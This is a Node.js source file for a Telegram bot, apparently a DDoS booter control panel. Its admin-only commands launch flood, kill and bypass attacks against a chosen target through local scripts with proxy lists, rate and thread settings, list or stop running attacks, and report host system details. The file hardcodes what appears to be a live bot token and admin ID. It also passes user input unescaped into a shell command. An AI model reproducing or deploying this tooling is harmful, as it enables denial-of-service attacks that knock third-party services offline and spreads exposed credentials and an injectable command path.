const TelegramBot = require('node-telegram-bot-api')
const si = require('systeminformation')
const { exec } = require('child_process')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0'
const adminId = '6601930239'
const bot = new TelegramBot(token, { polling: true })

let attacks = []

app.get('/', (req, res) => {
  res.json({ telegramAdmin: '@xkprj', status: 'Bot đang hoạt động' })
})

app.listen(port)

bot.onText(/^\/system$/, async (msg) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied')
    return
  }
  try {
    const data = await si.get({
      cpu: '*',
      mem: 'total, free, used, active, available',
      diskLayout: '*',
      fsSize: '*',
      osInfo: 'platform, distro, release, kernel, arch',
      swap: 'total, used, free'
    })
    bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
      cpu: data.cpu,
      memory: data.mem,
      disk: data.fsSize,
      diskLayout: data.diskLayout,
      os: data.osInfo,
      swap: data.swap
    }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  } catch {
    bot.sendMessage(msg.chat.id, 'Error fetching system info')
  }
})

bot.onText(/^\/attack(?:\s(.+))?/, (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied')
    return
  }

  if (!match[1]) {
    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
    return
  }

  const params = match[1].trim().split(/\s+/)
  if (params.length < 2) {
    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
    return
  }

  const method = ['flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'flood'
  const target = params.length === 3 ? params[1] : params[0]
  const time = parseInt(params.length === 3 ? params[2] : params[1])
  const rate = 24
  const threads = 12
  const proxyfile = './prx.txt'

  if (!target || isNaN(time)) {
    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
    return
  }

  const attackId = Date.now()
  const attackData = {
    id: attackId,
    target,
    time,
    rate,
    threads,
    proxyfile,
    status: 'started',
    messageId: null
  }

  const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
    if (err) {
      bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}`)
      attacks = attacks.filter(a => a.id !== attackId)
      return
    }
    bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`)
  })

  attackData.pid = child.pid
  attacks.push(attackData)

  bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
    status: attackData.status,
    target,
    time,
    rate,
    threads,
    proxyfile
  }, null, 2) + '\n```', { parse_mode: 'Markdown' }).then(sentMsg => {
    attackData.messageId = sentMsg.message_id

    setTimeout(() => {
      attackData.status = 'running'
      let remainingTime = time
      const interval = setInterval(() => {
        remainingTime -= 5
        if (remainingTime <= 0) {
          clearInterval(interval)
          bot.deleteMessage(msg.chat.id, attackData.messageId)
          attacks = attacks.filter(a => a.id !== attackId)
          return
        }
        bot.editMessageText('```json\n' + JSON.stringify({
          status: attackData.status,
          target,
          time: remainingTime,
          rate,
          threads,
          proxyfile
        }, null, 2) + '\n```', {
          chat_id: msg.chat.id,
          message_id: attackData.messageId,
          parse_mode: 'Markdown'
        }).catch(() => {
          clearInterval(interval)
          attacks = attacks.filter(a => a.id !== attackId)
        })
      }, 5000)
    }, 5000)
  })

  bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
})

bot.onText(/^\/list$/, (msg) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied')
    return
  }
  if (attacks.length === 0) {
    bot.sendMessage(msg.chat.id, 'No active attacks')
    return
  }
  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s`).join('\n')
  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`)
})

bot.onText(/^\/stop(?:\s(.+))?/, (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied')
    return
  }

  const input = match[1]
  if (!input || isNaN(parseInt(input))) {
    bot.sendMessage(msg.chat.id, 'Usage: /stop [attack_id]')
    return
  }

  const attackId = parseInt(input)
  const attack = attacks.find(a => a.id === attackId)
  if (!attack) {
    bot.sendMessage(msg.chat.id, 'Attack not found')
    return
  }

  attacks = attacks.filter(a => a.id !== attackId)
  try {
    process.kill(attack.pid)
    if (attack.messageId) {
      bot.deleteMessage(msg.chat.id, attack.messageId)
    }
    bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`)
  } catch (e) {
    bot.sendMessage(msg.chat.id, `Error stopping attack: ${e.message}`)
  }
})
